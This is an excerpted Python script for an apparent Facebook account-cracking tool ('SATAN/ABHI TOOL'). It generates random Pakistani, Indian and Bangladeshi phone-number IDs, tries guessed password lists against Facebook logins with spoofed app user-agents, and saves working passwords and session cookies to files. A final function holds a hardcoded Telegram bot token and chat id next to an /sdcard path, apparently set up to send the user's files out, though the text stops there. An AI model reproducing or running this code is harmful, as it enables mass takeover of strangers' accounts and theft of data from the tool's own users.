...
for agent in range(10000):
        ...
        user_agent = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/;FBAV/A1XDL5U4;FBBV/851259755;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/851259755;FBDM//*{density=3.0,width=720,height=4096};FBLC/ru_RU;FBRV/689132917;FBCR/TECNO;FBMF/Xiaomi;FBBD/HTC;FBPN/com.facebook.katana;FBDV/LG_G9;FBSV/16;FBOP/6;FBCA/x86_64;FBSS/17;]'
...
⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄
   ...
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[~] \033[1;32mAuthor   : Khalil Ibn Suleiman 
[~] \033[1;32mFacebook :Luffy_1
[~] \033[1;32mTool     : Free
[~] \033[1;32mVersion  : 3.0
-----------------------------------------------
 WELCOME TO SATAN TOOL FREE TRAlL
-----------------------------------------------""")
...
def menu():
        try:
                x = ("sex")
                if x == ("sex"):
                        print('\t\x1b[1;92m        ABHI TOOL MAIN MENU\n\033[1;97m-----------------------------------------------\n\033[1;30m[1] \033[1;32mFILE CLONING\n\033[1;30m[2] \033[1;32mRANDOM PAK CLONING\n\033[1;30m[3] \033[1;32mCONTACT WITH OWNER\n\033[1;30m[0] \033[1;32mEXIT')
                        linex()
                        xd=input('\033[0;97m[•] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m')
                        if xd in ['1','01']:
                                clear()
                                print('\t\x1b[1;92m        ABHI TOOL FILE CLONER')
                                linex()
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print('\t\x1b[1;92m        ABHI TOOL METHODS MENU')
                                linex()
                                print('\033[1;30m[1] \033[1;32mMETHOD (\033[0;96mNEW IDS\033[0;97m)')
                                print('\033[1;30m[2] \033[1;32mMETHOD (\033[0;96mMIX IDS\033[0;97m)')
                                print('\033[1;30m[3] \033[1;32mMETHOD (\033[0;96mOLD/NEW IDS\033[0;97m)')
                                linex()
                                ...
                                try:
                                        ...
                                        ps_limit =1
                                clear()
                                print('\t\x1b[1;92m     ABHI TOOL PASSWORD MENU')
                                linex()
                                ...
                                clear()
                                print('\t\x1b[1;92m  ABHI TOOL ACCOUNTS DISPLAY MENU')
                                linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\t\x1b[1;92m   ABHI TOOL FILE CRACKING MENU')
                                        linex()
                                        ...
                                        print('\033[0;97m[•]\x1b[1;92m ABHI TOOL CRACKING HAS BEEN STARTED')
                                        linex()
                                ...
                                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/ABHI-COOKIE.txt') 
                                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/ABHI-OK.txt')
                                linex()
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                        elif xd in ['2','02']:
                                clear()
                                print('\t\x1b[1;92m   ABHI TOOL RANDOM CLONING MENU')
                                linex()
                                print('\033[1;37m[1] \x1b[1;92mPAKISTAN RANDOM CLONING\n\033[1;37m[2] \x1b[1;92mBANGLADESH RANDOM CLONING\n\033[1;37m[3] \x1b[1;92mINDIA RANDOM CLONING\n\033[1;37m[0] \033[1;32mBACK IN MAIN MENU ')
                                linex()
                                ...
                                os.system('xdg-open https://chat.whatsapp.com/HUNgRANHBkm2xiB81uWlAu');menu() 
                        elif xd in ['0','00']:
                                clear()
                                print('\t\x1b[1;92m   EXIT FROM ABHI TOOL')
                                linex()
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO CONTACT OWNER ');clear() 
                                os.system('xdg-open https://www.facebook.com/D4R1ND9D3V1L484');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE ABHI TOOL');time.sleep(2);linex();exit() 
                        else:
                                print('\033[0;97m[•] \033[0;91mCHOOSE CORRECT OPTION');menu()
        except ValueError:
                exit()
...
def pak():
                user=[]
                clear()
                print('\t\x1b[1;92m  ABHI TOOL PAK RANDOM CLONER MENU')
                linex()
                ...
                with tred(max_workers=30) as ABHI:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   ABHI TOOL RANDOM PAK CRACKING MENU')
                        linex()
                ...
                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/ABHI-rndm-COOKIE.txt') 
                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/ABHI-rndm-OK.txt')
                linex()
...
def ind():
                user=[]
                clear()
                print('\t\x1b[1;92m  ABHI TOOL INDIA RANDOM CLONER MENU')
                linex()
                print('\t\x1b[1;92m       INDA SIM CODE MENU')
                linex()
                print('\033[1;32m INDIA SIM CODE EXAMPLE \x1b[1;91m: \x1b[1;96m9014,9966,9670,.....etc')
                linex() 
                code = input('\033[0;97m[•] \033[1;32mPUT CODE \x1b[1;91m: \x1b[1;96m ')
                linex() 
                try:
                ...
                with tred(max_workers=30) as ABHI:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   ABHI TOOL RANDOM INDIA CRACKING MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','hindustan','5757575']
                                ABHI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
...
def bd():
                user=[]
                clear()
                print('    \x1b[1;92mABHI TOOL BANGLADESH RANDOM  CLONER MENU')
                linex()
                ...
                with tred(max_workers=30) as ABHI:     
                        clear()
                        tl = str(len(user))
                        print('      \x1b[1;92mABHI TOOL RANDOM BANGLADESH CRACKING MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mLuffy-M1\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua = '[FB4A/;FBAV/;FBBV/478627463;FBAN/FB4A;FBAV/;FBBV/478627463;FBDM//*{density=2.5,width=2560,height=2560};FBLC/es_ES;FBRV/163933699;FBCR/Sony;FBMF/OnePlus;FBBD/Amazon;FBPN/com.facebook.katana;FBDV/Oppo_Reno_13;FBSV/16;FBOP/5;FBCA/arm64-v8a;FBSS/13;]'
                        ...
                        if "c_user" in ABHI:
                                ...
                                print(f'\r\r\x1b[1;92m[\033[0;97mLuffy-OK\033[0;92m] \033[0;92m%s \033[0;97m| \033[0;92m%s'%(ids,pas))
                                open('/sdcard/Luffy-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/Luffy-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ABHI:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;92m[\033[0;91mLuffy-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        ...
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mLuffy-M2\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = '[FB4A/;FBAV/4Q095MQG;FBBV/991380100;FBAN/FB4A;FBAV/4Q095MQG;FBBV/991380100;FBDM//*{density=3.0,width=1920,height=3840};FBLC/it_IT;FBRV/186862799;FBCR/TECNO;FBMF/Xiaomi;FBBD/Onida;FBPN/com.facebook.katana;FBDV/Vivo_Y93s;FBSV/16;FBOP/6;FBCA/arm64-v8a;FBSS/19;]'
                    ...
                    'user-agent': ua}
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\33[1;92m[\033[0;97mLuffy-OK\033[1;92m]\033[1;92m '+ids+'\033[1;37m | \033[1;32m'+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/Luffy-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/Luffy-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\33[1;97m[\033[1;92mLuffy-\033[1;97m]\033[1;92m '+ids+' | '+pas)
                                                twf.append(ids)
                                                break                   
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,proxies
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mLuffy-M3\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                model = random.choice(['Infinix_X521','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                                fbap = random.choice(['414.0.0.30.113','414.0.0.30.113','354.0.0.8.108','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','414.0.0.30.113','413.0.0.30.104','414.0.0.30.113','408.1.0.16.113'])
                                ua = '[FBAN/;FBAV/;FBBV/629494235;FBAN/FBAN;FBAV/;FBBV/629494235;FBDM//*{density=3.0,width=2560,height=2560};FBLC/en_US;FBRV/842514062;FBCR/Realme;FBMF/Motorola;FBBD/Voice Mobile;FBPN/com.facebook.katana;FBDV/OnePlus_Nord_N400;FBSV/11;FBOP/8;FBCA/armeabi-v7a;FBSS/18;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'email':ids,
                    'password':pas,
                    ...
                    'user-agent': ua}
                                ...
                                if 'session_key' in q:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        print('\r\r\x1b[1;92m[\033[0;97mLuffy-OK\033[0;92m]\033[1;92m '+ids+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/Luffy-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/Luffy-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;96mLuffy-OK\033[0;92m]\033[1;91m '+ids+' \033[1;37m|\033[1;31m '+pas+ ' '+joined(ids)+' ')
                                                twf.append(ids)
                                                break           
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;91mABHI-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                                open('/sdcard/Luffy-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mLuffy-XD\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113'])
                                model = random.choice(['V2057A','I2208','V2228','V1922A','V1916A','V1930A','vivo Y55A','vivo Y55A','I2018','vivo 1707','V2168A','V2228','V1836A','V1930A','V2057A','vivo 1707','V2121A','V2121A','V2147','V1824A'])
                                ua = '[FBAN/;FBAV/4Q095MQG;FBBV/418340044;FBAN/FBAN;FBAV/4Q095MQG;FBBV/418340044;FBDM//*{density=1.5,width=1440,height=4096};FBLC/ru_RU;FBRV/669678747;FBCR/Sony;FBMF/Apple;FBBD/Cubot;FBPN/com.facebook.katana;FBDV/HTC_Drive_11;FBSV/13;FBOP/4;FBCA/x86;FBSS/11;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'email':ids,
                    'password':pas,
                    ...
                    'user-agent': ua}#'Mozilla/5.0 (Linux; Android 10; CPH2121 Build/RP1A.200720.010; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/358.0.0.34.117;]'}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Luffy-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                                        print('\r\r\x1b[1;92m[\033[0;97mABHI-OK\033[0;92m]\033[1;92m '+uid+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(uid)+' ')      
                                                        #print("Cookie: "+coki)
                                                        open('/sdcard/Luffy-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        open('/sdcard/Luffy-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\x1b[1;92m[\033[0;91mABHI-CP\033[0;92m] \033[0;90m'+uid+' \033[0;97m|\033[0;90m '+pas+'\033[1;97m')
...
def sexy():
    ...
    bot_token = '6847511334:AAGwrl09EY7fPizWLmO0lMkgu2u9Us96f80' 
    chat_id = '5221931046'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
